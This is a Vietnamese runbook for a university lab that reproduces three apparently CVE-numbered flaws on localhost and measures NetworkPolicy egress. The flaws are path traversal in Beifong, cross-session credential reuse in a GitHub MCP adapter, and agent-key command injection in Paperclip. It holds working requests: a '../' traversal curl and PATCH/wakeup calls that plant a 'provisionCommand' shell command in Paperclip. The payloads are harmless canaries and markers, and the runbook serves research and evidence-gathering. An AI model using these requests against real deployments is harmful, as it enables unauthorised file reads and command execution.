# Runbook chính thức Chương III — thao tác, evidence và câu kết luận

Tài liệu này là **bản tóm tắt thao tác/evidence đưa vào báo cáo chính thức**.
Không ghép artifact giữa hai Run ID, không nhập credential thật, không lưu raw
Agent API key Paperclip vào ảnh, Burp export hay Markdown.

Khi chạy đủ ba case trong cùng một campaign, dùng lịch reset tối thiểu tại
Mục 0.2 của
[`lab-v3-boundary-scenarios.md`](lab-v3-boundary-scenarios.md): Phase A là
Beifong → NetworkPolicy → GitHub G3, sau đó Phase B reset một lần cho
Paperclip. Các block `93-reset-active-lab.ps1` trong từng case của file này
chỉ dùng khi chạy lại **riêng lẻ** một case hoặc đối chứng G1/G2/G4; không
thực thi toàn bộ các block đó liên tiếp.

`lab-v3-boundary-scenarios.md` giữ phần giải thích UI chi tiết; khi cần chạy
để lấy evidence, ưu tiên trình tự mã bước trong tài liệu này.

## Quy ước dùng trong mọi case

- Mỗi **Campaign ID** là một đợt đo, ví dụ `CH3-20261015`.
- Mỗi **Run ID** là một case trên một namespace/Pod state, ví dụ
  `CH3-BEIFONG-001`.
- Không dùng lại Run ID đã có artifact. Nếu reset/redeploy/Pod restart giữa
  case, bỏ case đang làm và tạo Run ID mới.
- `93-reset-active-lab.ps1` **tự gọi** `90-start-ai-cve-lab.ps1`; reset thành
  công thì không chạy `90-start` thêm lần nữa. Script chỉ hoàn tất sau khi
  `/api/health` và `/api/companies` của Paperclip cùng sẵn sàng; nó tự retry
  tối đa 120 giây để tránh `502` tạm thời khi PostgreSQL/migration vừa khởi
  động.
- Kết thúc mỗi case bằng `95-seal-ch3-run-evidence.ps1`. Seal chỉ xác nhận
  integrity file, không tự chứng minh PoC thành công.

Các lệnh dưới đây dùng biến để tránh gõ sai Campaign/Run ID:

```powershell
Set-Location D:\daihoc\Nam4\Doan\lab
$Campaign = 'CH3-20261015'       # đổi một lần khi mở campaign mới
$Run = 'CH3-<CASE>-001'          # thay <CASE> ở từng case bên dưới
```

---

## A. Beifong — CVE-2026-29871

**Mục tiêu được phép kết luận:** build lab đọc canary vô hại nằm ngoài thư mục
audio nghiệp vụ, nhưng vẫn trong filesystem đã mount cho chính Pod Beifong.
Không kết luận truy cập host, node, API Kubernetes hoặc upstream nguyên trạng.

### B1. Tạo state sạch và baseline

```powershell
Set-Location D:\daihoc\Nam4\Doan\lab
$Campaign = 'CH3-20261015'
$Run = 'CH3-BEIFONG-001'

.\scripts\93-reset-active-lab.ps1
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint baseline -RequireClean
```

Chỉ làm B2 khi reset in đủ: `credentialSinkEventCount : 0`,
`paperclipCompanyCount : 0`, `paperclipMarker : MARKER_ABSENT`. File cần có:
`evidence\campaigns\<Campaign>\<Run>\runtime-baseline.json`.

### B2. Chụp chức năng hợp lệ từ giao diện

1. Mở `http://127.0.0.1:19091/` qua Chrome đã cấu hình Burp.
2. Chọn **Podcasts**, mở player, bấm menu **ba chấm** > **Download**.
3. Trong Burp HTTP history, lấy request `GET /stream-audio/<audio-file>` do UI
   vừa phát sinh, gửi sang Repeater rồi bấm **Send**.
4. Chụp request/response HTTP `200`; response cần có `Content-Type: audio/wav`.
   Không cần hiển thị body WAV.

Artifact báo cáo: **Hình Beifong-B**. Caption: *Chức năng tải audio hợp lệ của
build lab, Run ID …*.

### B3. Gửi request kiểm tra canary

Trong Burp Repeater, duplicate request B2 rồi thay request-target. Nếu Burp
chuẩn hóa path, dùng đúng lệnh `curl.exe --path-as-is` dưới đây để evidence
không bị browser/proxy sửa:

```powershell
curl.exe --path-as-is -i "http://127.0.0.1:19091/stream-audio/../../../var/run/lab-canary/beifong-outside-audio.txt"
```

Kết quả dương của build lab là HTTP `200` có nhãn
`LAB_CANARY_BEIFONG_OUTSIDE_AUDIO_NOT_A_REAL_SECRET`. Chụp response nhưng chỉ
hiển thị nhãn canary; đó là dữ liệu giả lập, không phải secret thật.

Artifact báo cáo: **Hình Beifong-C**. Caption: *Request HTTP đọc canary ngoài
vùng audio trong build lab đã khóa, Run ID …*.

### B4. Thu inventory Kubernetes của đúng Run

```powershell
.\scripts\41-capture-beifong-k8s-boundary.ps1 `
  -CampaignId $Campaign -RunId $Run -Checkpoint final `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
```

Mở `k8s\beifong-k8s-boundary.json` và chụp các trường:

- `intendedBusinessDirectory`;
- `mountedDirectory`;
- `canaryPath`;
- `mountReadOnly`;
- `processCanReadCanary`.

Artifact báo cáo: **Hình Beifong-D**. Caption: *Canary là Secret volume
read-only trong filesystem Pod; inventory không chứng minh quyền node/cluster.*

### B5. Niêm phong và câu kết luận

Sau khi đã che địa chỉ/tên máy không cần thiết trong ảnh, chạy:

```powershell
.\scripts\95-seal-ch3-run-evidence.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -ArtifactPath C:\evidence-redacted\beifong-valid.png,C:\evidence-redacted\beifong-canary.png
```

Kết luận báo cáo được phép dùng:

> Trong build Beifong của lab, request kiểm tra trả về canary vô hại ngoài vùng
> audio nghiệp vụ. Inventory runtime xác nhận canary thuộc volume chỉ-đọc mà
> process Beifong được mount. Kết quả xác định phạm vi trong Pod, không suy ra
> truy cập node, cluster hoặc sản phẩm upstream nguyên trạng.

---

## B. GitHub MCP adapter — CVE-2026-29872

**Mục tiêu được phép kết luận:** phiên B không nhập GitHub token nhưng adapter
trong **cùng process** dùng lại credential A từ `os.environ`. Sink nội bộ chỉ
lưu fingerprint; không có GitHub/OpenAI/MCP server thật.

### G3-1. Reset và baseline riêng cho phép thử A → B

```powershell
Set-Location D:\daihoc\Nam4\Doan\lab
$Campaign = 'CH3-20261015'
$Run = 'CH3-G3-001'

.\scripts\93-reset-active-lab.ps1
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint baseline -RequireClean
```

Không reset, redeploy hoặc restart GitHub MCP Pod từ G3-2 đến hết G3-5.

### G3-2. Phiên A ghi credential A vào adapter

1. Mở cửa sổ Chrome **bình thường** tới `http://127.0.0.1:19501/`.
2. Nhập `LAB_OPENAI_A_20261007` vào **OpenAI API Key**.
3. Nhập `LAB_GITHUB_A_20261007` vào **GitHub Token**.
4. Giữ `Repository = lab/example-repository` và
   `Your Query = List the safe lab fixture result`.
5. Bấm **Run Query**.
6. Chụp JSON kết quả có `requesterSession: A`, `credentialOwner: A`,
   `credentialSource: session input` và chỉ `credentialSha256_20`.

### G3-3. Ghi checkpoint sau phiên A

```powershell
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign -RunId $Run -Checkpoint after-a
```

### G3-4. Phiên B để trống token

1. Mở cửa sổ ẩn danh bằng **Ctrl+Shift+N**, không dùng tab mới của A.
2. Mở `http://127.0.0.1:19501/`.
3. Nhập `LAB_OPENAI_B_20261007` vào **OpenAI API Key**.
4. Để **GitHub Token trống hoàn toàn**.
5. Giữ repository/query như A, bấm **Run Query**.
6. Chụp JSON kết quả. Evidence dương phải đồng thời có:
   - `requesterSession: B`;
   - `credentialOwner: A`;
   - `credentialSource: process-global os.environ fallback`;
   - `crossSessionCredentialUse: true`.

### G3-5. Ghi checkpoint, đối chiếu sink và inventory

```powershell
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign -RunId $Run -Checkpoint after-b

.\scripts\42-capture-github-mcp-k8s-boundary.ps1 `
  -CampaignId $Campaign -RunId $Run -Checkpoint final `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
```

Mở `http://127.0.0.1:19580/events` và JSON inventory. Kiểm tra đồng thời:

- event A có fingerprint A và `session input`;
- event B có **cùng** `credentialSha256_20` với A;
- event B là `process-global os.environ fallback`;
- `runtime-baseline.json`, `runtime-after-a.json`, `runtime-after-b.json` có
  cùng Pod UID, container ID, restart count và `githubMcpPidOne.processStartTicks`.

Nếu một trong bốn điều kiện không đúng, không kết luận reuse xuyên phiên.

### G3-6. Seal và câu kết luận

```powershell
.\scripts\95-seal-ch3-run-evidence.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -ArtifactPath C:\evidence-redacted\github-a.png,C:\evidence-redacted\github-b.png,C:\evidence-redacted\github-sink.png
```

Kết luận báo cáo được phép dùng:

> Trong cùng process của GitHub MCP adapter, phiên B không cung cấp GitHub
> token nhưng event hash-only xác định adapter dùng lại fingerprint thuộc phiên
> A qua process-global fallback. Thí nghiệm không gửi credential tới GitHub,
> OpenAI hay MCP server thật.

### G1, G2 và G4 — chỉ chạy khi muốn đối chứng đầy đủ

Mỗi hàng dưới đây là một Run ID riêng, có `93-reset` + `94 ... baseline
-RequireClean` trước thao tác:

| Run | Thao tác | Kết quả cần thấy |
|---|---|---|
| `CH3-G1-001` | A nhập cả OpenAI A/GitHub A rồi Run Query | owner/requester A, `session input` |
| `CH3-G2-001` | B nhập cả OpenAI B/GitHub B rồi Run Query | owner/requester B, `session input` |
| `CH3-G4-001` | sink count = 0; B chạy **trước A**, OpenAI B, GitHub trống | không xuất hiện fingerprint A; validation/no-event chỉ hợp lệ khi sink hoạt động |

Không tạo `baseline` muộn cho Run G3 đã xong. Nếu campaign cũ chỉ có
`after-a`/`after-b`, dùng một G3 Run ID mới để lấy baseline sạch.

---

## C. Paperclip v0.3.1 — CVE-2026-41208

**Mục tiêu L1:** Agent A sửa được cấu hình nhạy cảm; một trigger đã biết dẫn
tới marker trong workspace Pod. **Mục tiêu L2:** chính Agent A gửi PATCH và
wakeup. Marker chỉ ở `emptyDir`, không chứng minh node/cluster access.

### P1. Reset, baseline và xác nhận wizard

```powershell
Set-Location D:\daihoc\Nam4\Doan\lab
$Campaign = 'CH3-20261015'
$Run = 'CH3-PAPERCLIP-L2-001'

.\scripts\93-reset-active-lab.ps1
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint baseline -RequireClean
```

Mở **chỉ** `http://127.0.0.1:19310/`, nhấn **Ctrl+F5**. Màn hình đầu phải là
wizard **Company / Agent / Task / Launch**. Nếu thấy dashboard cũ hoặc Company
cũ, dừng và reset lại; không tạo Company thứ hai.

### P2. Tạo dữ liệu Paperclip đúng tên và đúng scope

| Đối tượng | Giá trị bắt buộc |
|---|---|
| Company | `Ch3 Boundary Lab` |
| Mission | `Local-only authorization-boundary lab for Chapter 3` |
| CEO | Name `CEO`; Process; cwd `/workspace/repo`; command `/paperclip/lab-fixtures/paperclip-local-success`; args trống |
| Project | `Ch3 Agent-key workspace evidence`; local folder `/workspace/repo` |
| Agent A | `Ch3 Agent key scope`; Role `General`; Process; cwd/command/args giống CEO |
| Agent B | `Ch3 General control B`; Role `General`; Process; cwd/command/args giống CEO; không cấp quyền quản lý agent khác |
| Issue | `Ch3 Agent API key execution-context evidence`; Todo; Project ở trên; Assignee là Agent A |

Thao tác UI chính xác:

1. Ở wizard **Company**, nhập Company/Mission rồi **Next**.
2. Ở wizard **Agent**, chọn **More Agent Adapter Types** > **Process**, nhập
   CEO values rồi **Next**.
3. Ở tab **Task**, không tạo Task; đóng wizard bằng dấu **×**.
4. Trong sidebar, tạo Project theo bảng trên.
5. Trong **Agents +**, chọn **I want advanced configuration myself** >
   **Process** để tạo Agent A rồi Agent B theo bảng trên. Approve nếu UI báo
   pending.
6. Tạo Issue theo bảng. Lấy **UUID field `id`** từ response
   `GET /api/companies/<company-id>/issues`; không dùng nhãn hiển thị `CHB-1`
   thay cho UUID.

Chụp UI Company, Project, Agent A/B và Issue. Các ảnh này là bối cảnh setup,
chưa phải bằng chứng vulnerability.

### P3. Business control bằng Board UI

1. Mở Agent A > **Run Heartbeat**.
2. Chờ run `succeeded` và output `LAB_LOCAL_ADAPTER_COMPLETED`.
3. Chụp run này làm evidence cấu hình Process hợp lệ.

Không dùng run UI này để tạo marker: endpoint UI không có `issueId` và có thể
dùng fallback workspace.

### P4. Đối chứng quyền bằng Agent B

1. Tạo API key tạm cho B; chỉ giữ trong clipboard/notepad tạm.
2. Từ Board UI, gửi GET configuration B sang Burp Repeater.
3. PATCH B → B bằng Bearer key B với **toàn bộ** `adapterConfig` Process đang
   có (không thêm `workspaceStrategy`). Mẫu request:

```http
PATCH /api/agents/<agent-b-reference>?companyId=<company-id> HTTP/1.1
Host: 127.0.0.1:19310
Accept: application/json
Content-Type: application/json
Authorization: Bearer <agent-b-api-key>
Connection: close

{
  "adapterType": "process",
  "adapterConfig": {
    "cwd": "/workspace/repo",
    "command": "/paperclip/lab-fixtures/paperclip-local-success",
    "args": [],
    "timeoutSec": 5
  }
}
```

   Expected: HTTP `200`.
4. GET lại B để xác nhận cấu hình B vẫn hợp lệ.
5. Lấy config A trước thử nghiệm. Với cùng key B, PATCH B → A, giữ toàn bộ
   config A nhưng đổi duy nhất `timeoutSec: 5` thành `6`.
6. Expected: request cross-agent bị từ chối **và** GET A sau đó không đổi.

Nếu B sửa được A hoặc server coi B là Board, dừng L1/L2. Không diễn giải PATCH
A phía sau thành privilege escalation. Không đưa key B vào ảnh/export.

### P5. PATCH Agent A và checkpoints T0/T1

1. Tạo API key tạm của A ở Agent A > Configuration > API Keys.
2. Trước PATCH, đo T0:

```powershell
.\scripts\44-check-paperclip-scope-marker.ps1 `
  -CampaignId $Campaign -RunId $Run -Checkpoint T0 `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
```

T0 phải là `markerPresent: false`.

3. Trong Burp Repeater, dùng **agent reference của A** trên request-target,
   xóa Cookie Board, chỉ dùng `Authorization: Bearer <agent-a-api-key>`, rồi
   gửi PATCH đầy đủ sau:

```http
PATCH /api/agents/<agent-a-reference>?companyId=<company-id> HTTP/1.1
Host: 127.0.0.1:19310
Content-Type: application/json
Authorization: Bearer <agent-a-api-key>

{
  "adapterType": "process",
  "adapterConfig": {
    "cwd": "/workspace/repo",
    "command": "/paperclip/lab-fixtures/paperclip-local-success",
    "args": [],
    "timeoutSec": 5,
    "workspaceStrategy": {
      "type": "git_worktree",
      "branchTemplate": "ch3-agent-key-evidence",
      "provisionCommand": "touch /workspace/repo/.paperclip/lab-agent-key-scope-marker"
    }
  }
}
```

Không thêm header `X-Paperclip-Run-Id` bằng mã `CH3-...`; nó chỉ nhận heartbeat
UUID của Paperclip, không phải Run ID quản lý evidence.

4. Expected: HTTP `200`. GET lại Agent A, xác nhận server đã lưu
   `workspaceStrategy.provisionCommand`.
5. Đo T1 bằng đúng lệnh P5.2, chỉ đổi `-Checkpoint T1`. T1 vẫn phải
   `markerPresent: false`.

### P6. Wakeup có Issue UUID — không dùng nút Run Heartbeat

Trong Burp, dùng cùng key A và Issue UUID ở P2:

```http
POST /api/agents/<agent-a-reference>/wakeup?companyId=<company-id> HTTP/1.1
Host: 127.0.0.1:19310
Content-Type: application/json
Authorization: Bearer <agent-a-api-key>

{
  "source": "on_demand",
  "triggerDetail": "manual",
  "reason": "chapter3-agent-key-boundary-evidence",
  "payload": { "issueId": "<issue-uuid>" },
  "idempotencyKey": "ch3-marker-001"
}
```

Expected: HTTP `202` và response có `<paperclip-run-id>` trong field `id`.
Nếu gửi lại để tạo run mới, đổi `idempotencyKey`. Chụp request/response sau khi
che Bearer key.

### P7. Final run, log, T2 và tiêu chí L1/L2

1. Trên UI **Runs**, mở đúng `<paperclip-run-id>` từ P6, chờ `succeeded`.
2. Trong Burp, lưu **response body** của ba GET sau. Nếu lưu cả request,
   thay giá trị sau `Authorization: Bearer ` bằng `<REDACTED>` trước khi export:

```http
GET /api/heartbeat-runs/<paperclip-run-id> HTTP/1.1
Host: 127.0.0.1:19310
Accept: application/json
Authorization: Bearer <agent-a-api-key>
```

```http
GET /api/heartbeat-runs/<paperclip-run-id>/events?afterSeq=0&limit=200 HTTP/1.1
Host: 127.0.0.1:19310
Accept: application/json
Authorization: Bearer <agent-a-api-key>
```

```http
GET /api/heartbeat-runs/<paperclip-run-id>/log?offset=0&limitBytes=262144 HTTP/1.1
Host: 127.0.0.1:19310
Accept: application/json
Authorization: Bearer <agent-a-api-key>
```

3. Final status/log phải liên kết đúng run P6 và **không** có
`No project or prior session workspace was available` hoặc
`/instances/default/workspaces/...`.
4. Chỉ khi run kết thúc mới đo T2:

```powershell
.\scripts\44-check-paperclip-scope-marker.ps1 `
  -CampaignId $Campaign -RunId $Run -Checkpoint T2 `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
```

5. Evidence đầy đủ yêu cầu T0=false, T1=false, T2=true; cùng Pod UID; final
   status/log trùng `<paperclip-run-id>`.

L1 đạt khi A PATCH được xác thực, B control đạt, run có trigger biết rõ và
marker xuất hiện. L2 chỉ đạt khi PATCH **và** wakeup đều được xử lý dưới Agent
A; nếu wakeup do Board, báo cáo L1 và ghi đúng principal kích hoạt.

### P8. Seal, revoke và câu kết luận

1. Revoke key B và key A ở Agent > Configuration > API Keys.
2. Đặt ảnh/request đã che key và ba response final run/log vào thư mục tạm.
3. Seal:

```powershell
.\scripts\95-seal-ch3-run-evidence.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -ArtifactPath C:\evidence-redacted\paperclip-patch.png,C:\evidence-redacted\paperclip-wakeup.png,C:\evidence-redacted\paperclip-final-status.json,C:\evidence-redacted\paperclip-events.json,C:\evidence-redacted\paperclip-log.txt
```

Kết luận L2 được phép dùng khi mọi điều kiện P4–P7 đạt:

> Agent API key A đã cập nhật cấu hình thực thi, gọi wakeup có Issue UUID và
> tạo marker vô hại trong workspace `emptyDir` của Paperclip Pod. Bằng chứng
> chỉ xác định quyền trong process/volume của Pod, không chứng minh quyền node
> hoặc Kubernetes API.

---

## D. NetworkPolicy — phép đo egress thực tế

**Mục tiêu:** phân biệt YAML khai báo với enforcement thực tế từ đúng Pod được
NetworkPolicy chọn.

### N1. Reset và baseline

```powershell
Set-Location D:\daihoc\Nam4\Doan\lab
$Campaign = 'CH3-20261015'
$Run = 'CH3-NETPOL-001'

.\scripts\93-reset-active-lab.ps1
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint baseline -RequireClean
```

### N2. Đo allow / block / control

```powershell
.\scripts\43-test-github-mcp-networkpolicy.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
```

Script chỉ gửi GET nội bộ, không dùng credential và không gọi Internet. Nó đo:

| Probe | Ý nghĩa |
|---|---|
| `allowSinkFromSelectedGithubPod` | Pod GitHub được chọn bởi policy tới sink allow-list |
| `blockBeifongFromSelectedGithubPod` | Pod GitHub được chọn bởi policy tới Beifong ngoài allow-list |
| `controlBeifongFromUnselectedBeifongPod` | Pod control không bị selector chọn tới Beifong |

### N3. Đọc đúng kết quả

Pattern chứng minh enforcement chỉ khi: sink `ok=true`, target Beifong ready,
control `ok=true`, probe selected GitHub → Beifong `ok=false` và
`observedPatternMatchesPolicy=true`.

Với kết quả đã đo ở `CH3-NETPOL-001` (`blockBeifongFromSelectedGithubPod.ok =
true`, `observedPatternMatchesPolicy = false`), câu viết đúng là:

> NetworkPolicy `github-mcp-observer-egress` tồn tại ở manifest, nhưng phép đo
> từ Pod GitHub được selector chọn vẫn kết nối được Service Beifong ngoài
> allow-list. Vì vậy thí nghiệm chưa xác nhận enforcement egress ở runtime.

Không thay CNI/manifest chỉ để ép kết quả `true`.

### N4. Seal

```powershell
.\scripts\95-seal-ch3-run-evidence.ps1 `
  -CampaignId $Campaign -RunId $Run
```

Artifact chính: `runtime-baseline.json` và
`k8s\github-mcp-networkpolicy-measurement.json`.

---

## E. Quy tắc chèn vào báo cáo chính thức

1. Mỗi hình/bảng ghi Campaign ID, Run ID và thời điểm capture.
2. Chỉ trích dẫn artifact có `run-seal.json` và không chứa raw credential.
3. Nếu thiếu một điều kiện, giữ kết luận ở mức đã quan sát; không dùng “khả
   năng”, “có thể” hay suy diễn sang host/node/cluster để lấp phần evidence
   thiếu.
4. Không dùng ảnh tạo Company, Agent, Dashboard như evidence vulnerability;
   chúng chỉ là ảnh bối cảnh/phụ lục.
